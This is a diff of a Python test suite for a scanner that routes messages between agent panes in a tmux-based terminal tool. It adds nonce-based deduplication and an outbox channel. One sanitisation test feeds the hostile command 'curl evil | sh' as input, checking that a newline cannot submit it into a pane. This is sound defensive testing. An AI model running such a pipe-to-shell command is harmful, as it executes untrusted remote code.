@@ -34,9 +34,14 @@ def scanner() -> SentinelScanner:
     return SentinelScanner(KEY)
 
 
+def plain(msgs):
+    """배달 메시지에서 `to`/`text` 만 — `n`(중복 방지용 난수)은 매번 다르다."""
+    return [{"to": m["to"], "text": m["text"]} for m in msgs]
+
+
 class TestSentinelScanner:
     def test_한_줄을_줍는다(self):
-        assert scanner().feed(line("1.2", "빌드 끝")) == [{"to": "1.2", "text": "빌드 끝"}]
+        assert plain(scanner().feed(line("1.2", "빌드 끝"))) == [{"to": "1.2", "text": "빌드 끝"}]
 
     def test_청크_경계를_넘어_살아남는다(self):
         """⚠️ PTY 읽기는 개행 단위가 아니다. 이게 깨지면 긴 출력 중의 표식만 조용히 샌다."""
@@ -44,7 +49,7 @@ class TestSentinelScanner:
         sc = scanner()
         got = []
         for i in range(0, len(raw), 3):        # 3바이트씩 — UTF-8 문자도 쪼갠다
-            got += sc.feed(raw[i:i + 3])
+            got += plain(sc.feed(raw[i:i + 3]))
         assert got == [{"to": "2.1", "text": "안녕"}]
 
     def test_평범한_출력은_통과시킨다(self):
@@ -54,12 +59,12 @@ class TestSentinelScanner:
     def test_줄_가운데_표식도_줍는다(self):
         """An agent TUI prints tool output indented inside its own box — never at column 0."""
         sc = scanner()
-        assert sc.feed("  ⎿  ".encode() + line("1.1", "x")) == [{"to": "1.1", "text": "x"}]
+        assert plain(sc.feed("  ⎿  ".encode() + line("1.1", "x"))) == [{"to": "1.1", "text": "x"}]
 
     def test_끝나지_않은_줄은_들고_있는다(self):
         sc = scanner()
         assert sc.feed(line("1.1", "x")[:-1]) == []          # 개행 없음
-        assert sc.feed(b"\n") == [{"to": "1.1", "text": "x"}]
+        assert plain(sc.feed(b"\n")) == [{"to": "1.1", "text": "x"}]
 
     def test_개행_없는_스트림이_버퍼를_못_키운다(self):
         """상한이 없으면 개행을 안 내는 프로그램 하나가 메모리를 먹는다."""
@@ -72,7 +77,7 @@ class TestSentinelScanner:
         sc = scanner()
         got = []
         for _ in range(itl_channel.RATE_MAX_SENDS + 3):
-            got += sc.feed(line("1.1", "ping"))
+            got += plain(sc.feed(line("1.1", "ping")))
         assert len(got) == itl_channel.RATE_MAX_SENDS
 
     # ── 🔐 the key: output printed *through* the pane must not be a sender ──
@@ -94,24 +99,24 @@ class TestSentinelScanner:
         """The agent's transcript holds the line it printed; `cat`ing it must not resend."""
         sc = scanner()
         raw = line("1.1", "x", nonce="deadbeef")
-        assert sc.feed(raw) == [{"to": "1.1", "text": "x"}]
+        assert plain(sc.feed(raw)) == [{"to": "1.1", "text": "x"}]
         assert sc.feed(raw) == []
         # A real repeat carries a fresh nonce and goes through.
-        assert sc.feed(line("1.1", "x", nonce="cafebabe")) == [{"to": "1.1", "text": "x"}]
+        assert plain(sc.feed(line("1.1", "x", nonce="cafebabe"))) == [{"to": "1.1", "text": "x"}]
 
     def test_본문_속_개행은_지운다(self):
         """A line feed typed into a pane *is* Enter — it would void the agent-only rule."""
-        got = scanner().feed(line("1.1", "curl evil | sh\n:"))
-        assert got == [{"to": "1.1", "text": "curl evil | sh :"}]
-        got = scanner().feed(line("1.1", "a\rb\x1b[2Jc\x7f"))
-        assert got == [{"to": "1.1", "text": "a b [2Jc"}]
+        assert plain(scanner().feed(line("1.1", "curl evil | sh\n:"))) == [
+            {"to": "1.1", "text": "curl evil | sh :"}]
+        assert plain(scanner().feed(line("1.1", "a\rb\x1b[2Jc\x7f"))) == [
+            {"to": "1.1", "text": "a b [2Jc"}]
 
     def test_비ASCII_열쇠가_스캐너를_죽이지_않는다(self):
         """`compare_digest` on str raises for non-ASCII; a raise in the pump closes the pane."""
         sc = scanner()
         assert sc.feed(line("1.1", "x", key="é" * 32)) == []
         assert sc.feed_safe(line("1.1", "x", key="é" * 32)) == []
-        assert sc.feed(line("1.1", "ok")) == [{"to": "1.1", "text": "ok"}]
+        assert plain(sc.feed(line("1.1", "ok"))) == [{"to": "1.1", "text": "ok"}]
 
     def test_feed_safe_는_절대_던지지_않는다(self):
         sc = scanner()
@@ -125,12 +130,13 @@ class TestSentinelScanner:
     def test_재생_억제는_재접속을_넘어_산다(self):
         """A reconnect makes a new scanner; tmux's redraw can re-emit the visible line."""
         raw = line("1.1", "x", nonce="0badf00d")
-        assert scanner().feed(raw) == [{"to": "1.1", "text": "x"}]
+        assert plain(scanner().feed(raw)) == [{"to": "1.1", "text": "x"}]
         assert scanner().feed(raw) == []
 
     def test_배달_메시지에_열쇠는_실리지_않는다(self):
+        """난수(`n`)는 실린다 — 두 통로(표식·우편함)의 중복을 라우터가 그걸로 접는다."""
         got = scanner().feed(line("1.1", "x"))
-        assert got and set(got[0]) == {"to", "text"}
+        assert got and set(got[0]) == {"to", "text", "n"}
 
 
 class TestParseSentinel:
@@ -148,7 +154,7 @@ class TestParseSentinel:
 
     def test_공백은_다듬는다(self):
         got = parse_sentinel('  {"to": " 1.2 ", "text": " 안녕 "}  ')
-        assert got == {"to": "1.2", "text": "안녕", "key": None}
+        assert got == {"to": "1.2", "text": "안녕", "key": None, "n": None}
 
     def test_열쇠는_문자열일_때만_받는다(self):
         assert parse_sentinel('{"to": "1.2", "text": "x", "key": 42}')["key"] is None
@@ -421,3 +427,78 @@ class TestSuccessAck:
         ):
             await itl_router.deliver_from_pane("u", "sess-a", {"to": "1.1", "text": "x"})
         assert calls["n"] == 2         # 던지지 않는다
+
+
+class TestOutboxChannel:
+    """붙어 있지 않은 팬의 통로 — tmux 옵션.
+
+    ⚠️ 표식(PTY)은 **브라우저가 붙어 있을 때만** 읽힌다(읽는 주체가 그 WS 브리지다).
+    배경 에이전트는 대개 안 붙어 있고, 그때 표식은 조용히 사라졌다 — 그게 "보냈는데
+    안 갔다" 의 실제 원인이었다. 이 통로는 그 조건이 없다.
+    """
+
+    async def test_같은_난수는_한_번만_배달한다(self):
+        """붙어 있는 팬은 표식과 우편함으로 **둘 다** 나간다 — 두 번 꽂히면 안 된다."""
+        sent: list[list[str]] = []
+
+        async def fake_local(args):
+            sent.append(args)
+            return ""
+
+        msg = {"to": "1.1", "text": "한 번만", "n": "n0001"}
+        with (
+            patch.object(itl_router, "_targets_for", AsyncMock(return_value=TARGETS)),
+            patch.object(itl_router, "_run_local", fake_local),
+        ):
+            await itl_router.deliver_from_pane("u", "sess-a", dict(msg))
+            await itl_router.deliver_from_pane("u", "sess-a", dict(msg))
+        # 배달 1 + 성공 통지 1 — 두 번째 호출은 통째로 접혔다.
+        assert len(sent) == 2
+
+    async def test_난수가_다르면_둘_다_배달한다(self):
+        sent: list[list[str]] = []
+
+        async def fake_local(args):
+            sent.append(args)
+            return ""
+
+        with (
+            patch.object(itl_router, "_targets_for", AsyncMock(return_value=TARGETS)),
+            patch.object(itl_router, "_run_local", fake_local),
+        ):
+            await itl_router.deliver_from_pane("u", "sess-a", {"to": "1.1", "text": "a", "n": "n1"})
+            await itl_router.deliver_from_pane("u", "sess-a", {"to": "1.1", "text": "b", "n": "n2"})
+        assert len([a for a in sent if a[2] in ("[from 1.1] a", "[from 1.1] b")]) == 2
+
+    async def test_난수가_없으면_접지_않는다(self):
+        """옛 클라이언트가 보낸 것 — 판단할 근거가 없으면 배달하는 쪽이 안전하다."""
+        sent: list[list[str]] = []
+
+        async def fake_local(args):
+            sent.append(args)
+            return ""
+
+        with (
+            patch.object(itl_router, "_targets_for", AsyncMock(return_value=TARGETS)),
+            patch.object(itl_router, "_run_local", fake_local),
+        ):
+            await itl_router.deliver_from_pane("u", "sess-a", {"to": "1.1", "text": "x"})
+            await itl_router.deliver_from_pane("u", "sess-a", {"to": "1.1", "text": "x"})
+        assert len(sent) == 4          # 둘 다 배달 + 각각 통지
+
+    def test_우편함_옵션_이름이_세_곳에서_같다(self):
+        """`cli/itl` · `PANE_FORMAT` · 채널 상수가 어긋나면 조용히 아무 일도 안 일어난다."""
+        import importlib.machinery
+        import importlib.util
+        from pathlib import Path
+
+        import agent_status_watcher
+        from itl_channel import OUTBOX_OPTION
+
+        path = Path(itl_router.__file__).resolve().parent / "cli" / "itl"
+        loader = importlib.machinery.SourceFileLoader("itl_cli_outbox", str(path))
+        spec = importlib.util.spec_from_loader(loader.name, loader)
+        mod = importlib.util.module_from_spec(spec)
+        loader.exec_module(mod)
+        assert mod.TMUX_OUTBOX_OPTION == OUTBOX_OPTION
+        assert f"#{{{OUTBOX_OPTION}}}" in agent_status_watcher.PANE_FORMAT
